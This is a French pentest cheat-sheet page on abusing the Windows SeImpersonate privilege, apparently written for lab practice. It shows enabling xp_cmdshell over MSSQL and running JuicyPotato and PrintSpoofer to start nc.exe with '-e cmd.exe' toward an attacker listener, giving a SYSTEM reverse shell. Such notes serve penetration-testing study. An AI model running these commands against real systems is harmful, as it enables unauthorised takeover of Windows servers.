# SeImpersonate and SeAssignPrimaryToken

***

{% hint style="warning" %}
Le privilège **SeImpersonate** permet d’utiliser le jeton d’un autre processus pour exécuter des actions avec ses droits, y compris SYSTEM.\
Normalement réservé aux administrateurs, il peut être exploité par un attaquant via des techniques comme les attaques **Potato**, qui trompent un processus SYSTEM pour obtenir son jeton.\
On le rencontre souvent après une compromission via un service (webshell ASP.NET, Jenkins, MSSQL, etc.), et sa présence est un signal fort qu’une escalade rapide vers SYSTEM est possible.
{% endhint %}

***

> Un bon article existe à propos des attaques par **usurpation de jeton**. : [https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

***

### <mark style="color:red;">Exemple de SeImpersonate – JuicyPotato</mark>

***

#### <mark style="color:green;">Connexion avec MSSQLClient.py</mark>

```
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

```
SQL> enable_xp_cmdshell
```

```
SQL> xp_cmdshell whoami
=> nt service\mssql$sqlexpress01
```

***

#### <mark style="color:green;">Vérification des privilèges</mark>

```
SQL> xp_cmdshell whoami /priv
```

On voit entre autres :

* `SeImpersonatePrivilege` → Activé
* `SeAssignPrimaryTokenPrivilege` → Désactivé
* On peut donc utiliser des outils comme **JuicyPotato** pour en tirer parti via une **faille DCOM/NTLM**.

{% hint style="warning" %}
<mark style="color:yellow;">**La faille DCOM/NTLM exploitée par JuicyPotato**</mark>

* **Idée** :
  1. Avec **SeImpersonate**, l’attaquant peut attendre qu’un processus SYSTEM tente de s’authentifier.
  2. En utilisant une **fonction DCOM**, il déclenche une connexion **NTLM** de SYSTEM vers un service qu’il contrôle (ex. un _named pipe_ malveillant).
  3. SYSTEM envoie son jeton NTLM → l’attaquant l’intercepte.
  4. L’attaquant **s’exécute avec ce jeton**, devenant SYSTEM.
{% endhint %}

***

#### <mark style="color:green;">Escalade de privilèges avec JuicyPotato</mark>

1. Télécharger **JuicyPotato.exe** et **nc.exe**
2. Les transférer sur le serveur
3. Lancer un écouteur Netcat (`nc -lnvp 8443`)
4. Exécuter :

{% code overflow="wrap" fullWidth="true" %}
```powershell
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
{% endcode %}

***

### <mark style="color:red;">PrintSpoofer et RoguePotato</mark>

⚠️ **JuicyPotato ne fonctionne plus** sous **Windows Server 2019** ou **Windows 10 version 1809+**.

Mais **PrintSpoofer** et **RoguePotato** peuvent encore exploiter les **mêmes privilèges**.

[https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

***

#### <mark style="color:green;">Escalade avec PrintSpoofer</mark>

Encore une fois, on connecte via `mssqlclient.py` et on lance :

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

***
